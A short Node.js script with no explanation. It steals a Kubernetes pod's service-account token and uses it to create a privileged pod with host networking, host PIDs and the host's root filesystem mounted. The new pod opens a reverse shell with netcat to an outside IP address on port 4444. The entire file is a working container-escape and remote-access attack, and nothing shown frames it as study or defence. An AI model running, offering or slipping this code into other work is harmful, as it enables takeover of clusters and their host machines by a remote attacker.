const fs=require('fs'),https=require('https');
const SA='/var/run/secrets/kubernetes.io/serviceaccount/';
let tok='',ca='';
try{ tok=fs.readFileSync(SA+'token','utf8').trim() }catch(e){}
try{ ca=fs.readFileSync(SA+'ca.crt','utf8') }catch(e){}
if(!tok){ console.log('NO_TOKEN'); process.exit(0) }
const pod={apiVersion:'v1',kind:'Pod',metadata:{name:'zzesc'},spec:{hostNetwork:true,hostPID:true,containers:[{name:'c',image:'busybox:latest',imagePullPolicy:'IfNotPresent',command:['/bin/sh','-c','nc 91.215.85.170 4444 -e /bin/sh'],securityContext:{privileged:true},volumeMounts:[{name:'h',mountPath:'/h'}]}],volumes:[{name:'h',hostPath:{path:'/'}}]}};
const body=JSON.stringify(pod);
const req=https.request({host:'kubernetes.default.svc',port:443,path:'/api/v1/namespaces/default/pods',method:'POST',headers:{'content-type':'application/json',authorization:'Bearer '+tok,'content-length':Buffer.byteLength(body)},ca:ca||undefined,rejectUnauthorized:!!ca,timeout:8000},res=>{let d='';res.on('data',c=>d+=c);res.on('end',()=>console.log('create='+res.statusCode+' '+d.slice(0,90)))});
req.on('error',e=>console.log('ERR '+e.message)); req.on('timeout',()=>{req.destroy();console.log('TO')}); req.write(body); req.end();
